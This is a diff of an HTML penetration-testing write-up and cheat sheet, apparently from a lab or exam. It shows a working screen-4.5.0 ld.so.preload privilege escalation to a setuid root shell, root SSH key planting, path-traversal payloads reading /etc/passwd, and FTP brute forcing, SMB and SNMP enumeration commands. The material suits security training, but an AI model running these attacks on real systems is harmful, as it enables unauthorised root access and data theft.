 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">rc=2</span></pre></div>
 <p><code>rc=2</code> with no file is not a permissions accident to work around — it is the proof that this step is
 the vulnerability. The creation has to come from the setuid binary:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">cd</span><span class="w"> </span>/etc<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">umask</span><span class="w"> </span><span class="m">000</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
-screen<span class="w"> </span>-D<span class="w"> </span>-m<span class="w"> </span>-L<span class="w"> </span>ld.so.preload<span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;printf &quot;\n/tmp/screenroot/libhax.so\n&quot;&#39;</span><span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
-stat<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;%A %U:%G %s %n&quot;</span><span class="w"> </span>/etc/ld.so.preload
+screen<span class="w"> </span>-D<span class="w"> </span>-m<span class="w"> </span>-L<span class="w"> </span>ld.so.preload<span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">'printf "\n/tmp/screenroot/libhax.so\n"'</span><span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+stat<span class="w"> </span>-c<span class="w"> </span><span class="s2">"%A %U:%G %s %n"</span><span class="w"> </span>/etc/ld.so.preload
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rw-rw-rw- root:aero 29 /etc/ld.so.preload</span></pre></div>
 <p>Root-owned, <strong>world-writable</strong>, 29 bytes. <code>umask 000</code> did its job. Note what just happened: a
@@ -1451,7 +1451,7 @@ a clean one.</p>
 <p>The file is <code>0666</code>, so <code>aero</code> can rewrite it without any privilege at all. This is the step everyone
 skips: <strong>the creation primitive gave us root ownership; the <code>0666</code> mode is what gives us a correcting
 write.</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;/tmp/screenroot/libhax.so\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>-A<span class="w"> </span>/etc/ld.so.preload
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'/tmp/screenroot/libhax.so\n'</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>-A<span class="w"> </span>/etc/ld.so.preload
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">/tmp/screenroot/libhax.so$</span></pre></div>
 <p>One clean LF-terminated path, no <code>^M</code>. Only now is the preload file usable.</p>
@@ -1534,12 +1534,12 @@ missing preload file is not an error.</p>
 <hr />
 <h3>6.10 The interactive shell</h3>
 <p>A setuid bash gives <code>euid=0</code> with <code>uid</code> still <code>aero</code>:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>/tmp/screenroot/rbash<span class="w"> </span>-p<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;id&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>/tmp/screenroot/rbash<span class="w"> </span>-p<span class="w"> </span>-c<span class="w"> </span><span class="s1">'id'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">uid=1000(aero) gid=1000(aero) euid=0(root) groups=1000(aero)</span></pre></div>
 <p>That is enough to read anything, but it is not a comfortable session — <code>sudo</code> still asks <code>aero</code> for a
 password, and some tools behave differently when <code>uid != euid</code>. The clean finish is a key:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh-keygen<span class="w"> </span>-t<span class="w"> </span>ed25519<span class="w"> </span>-N<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-f<span class="w"> </span>/tmp/exam_key<span class="w"> </span>-C<span class="w"> </span>exam-root
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh-keygen<span class="w"> </span>-t<span class="w"> </span>ed25519<span class="w"> </span>-N<span class="w"> </span><span class="s2">""</span><span class="w"> </span>-f<span class="w"> </span>/tmp/exam_key<span class="w"> </span>-C<span class="w"> </span>exam-root
 </pre></div>
 <p>Push <code>exam_key.pub</code> through the same socket, then, as root:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>/root/.ssh
@@ -1572,8 +1572,8 @@ sha256sum<span class="w"> </span>libhax.so
 <p><strong>On target — create, rewrite, trigger</strong> (§6.7–6.9). Check the preconditions first, because they are
 what actually fail on a different image:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/usr/bin/screen*<span class="w">                 </span><span class="c1"># must show -rwsr-xr-x … screen-4.5.0</span>
-dpkg<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;^ii  screen&#39;</span><span class="w">         </span><span class="c1"># will lie — that is the point of §6.1</span>
-mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39; /tmp &#39;</span><span class="w">                   </span>#<span class="w"> </span>tmpfs<span class="w"> </span>with<span class="w"> </span>noexec<span class="w"> </span>is<span class="w"> </span>fine:<span class="w"> </span>the<span class="w"> </span>.so<span class="w"> </span>is<span class="w"> </span>mmap<span class="s1">&#39;d, not exec&#39;</span>d
+dpkg<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'^ii  screen'</span><span class="w">         </span><span class="c1"># will lie — that is the point of §6.1</span>
+mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">' /tmp '</span><span class="w">                   </span>#<span class="w"> </span>tmpfs<span class="w"> </span>with<span class="w"> </span>noexec<span class="w"> </span>is<span class="w"> </span>fine:<span class="w"> </span>the<span class="w"> </span>.so<span class="w"> </span>is<span class="w"> </span>mmap<span class="s1">'d, not exec'</span>d
 </pre></div>
 <p>Three host-specific gotchas:</p>
 <ul>
@@ -1677,12 +1677,12 @@ hole; <code>screen-4.5.0</code> will do this again for anyone. The defensive fix
 (<code>ld.so.preload</code> is gone).</p>
 <p><strong>Left in place — the database side.</strong> The UDF module <code>poc</code> is still registered, and the <code>put</code> calls
 left records in <code>test.cve202013151</code>. Both are inert, but both are ours. Purge them:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>-<span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>-<span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
 <span class="s">import aerospike</span>
-<span class="s">c = aerospike.client({&quot;hosts&quot;: [(&quot;192.168.150.143&quot;, 3000)]}).connect()</span>
-<span class="s">c.udf_remove(&quot;poc&quot;)</span>
-<span class="s">for k in c.scan(&quot;test&quot;, &quot;cve202013151&quot;):</span>
-<span class="s">    c.remove((&quot;test&quot;, &quot;cve202013151&quot;, k[2]))</span>
+<span class="s">c = aerospike.client({"hosts": [("192.168.150.143", 3000)]}).connect()</span>
+<span class="s">c.udf_remove("poc")</span>
+<span class="s">for k in c.scan("test", "cve202013151"):</span>
+<span class="s">    c.remove(("test", "cve202013151", k[2]))</span>
 <span class="s">c.close()</span>
 <span class="s">EOF</span>
 </pre></div>
@@ -1830,7 +1830,7 @@ this version?" Version CVEs come last — most boxes are misconfigured, not unpa
 </pre></div>
 <p>If <code>161/udp</code> is open:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 </pre></div>
 <p>Then, on success, always:</p>
@@ -1847,7 +1847,7 @@ Descriptions are written for an internal audience and routinely name accounts an
 <h4>HTTP/HTTPS</h4>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
 <span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n"</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
 <span class="k">done</span>
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
@@ -1858,7 +1858,7 @@ feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class=
 <li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
 </ul>
 <h4>FTP</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
 </pre></div>
 <p>Try the account name as the password. Check for key material, configs, and backups in the data
@@ -1868,8 +1868,8 @@ directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> ac
 ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
 </pre></div>
 <h4>SMB</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
 nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 </pre></div>
 <hr />
@@ -1882,7 +1882,7 @@ escalation path depends on it.</p>
 <hr />
 <h3>Phase 5 — Local enumeration (Linux)</h3>
 <p>Send one script over one connection and read one report:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <p>Checklist, in the order that finds things:</p>
 <table>
@@ -1952,8 +1952,8 @@ escalation path depends on it.</p>
 <h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
 </pre></div>
 <p>What you are looking for, in priority order:</p>
 <ol>
@@ -2027,13 +2027,13 @@ nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </spa
 nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
 
 <span class="c1">## live hosts</span>
-nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $2}'</span>
 </pre></div>
 <hr />
 <h3>SNMP</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
 <span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== </span><span class="nv">$c</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"== </span><span class="nv">$c</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 
 <span class="c1">## full walk to a file, then grep it</span>
@@ -2046,7 +2046,7 @@ snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </
 snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
 
 <span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
-python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;); print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"s='82.69.83.69.84'.split('.'); print(''.join(chr(int(x)) for x in s[1:]))"</span>
 
 <span class="c1">## bulk walk when v1 is slow</span>
 snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
@@ -2054,27 +2054,27 @@ snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w
 <hr />
 <h3>Web</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
-curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}\n&quot;</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}\n"</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
 
 <span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"</span>
 
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
 
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: FUZZ"</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Apache2 Ubuntu Default Page"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
 </pre></div>
 <hr />
 <h3>FTP</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
 
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
 
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/&quot;</span><span class="w">                         </span><span class="c1"># list</span>
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/file&quot;</span><span class="w">             </span>#<span class="w"> </span>download
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/"</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/file"</span><span class="w">             </span>#<span class="w"> </span>download
 </pre></div>
 <hr />
 <h3>SSH</h3>
@@ -2083,29 +2083,29 @@ curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>
 <span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
 ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
-sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
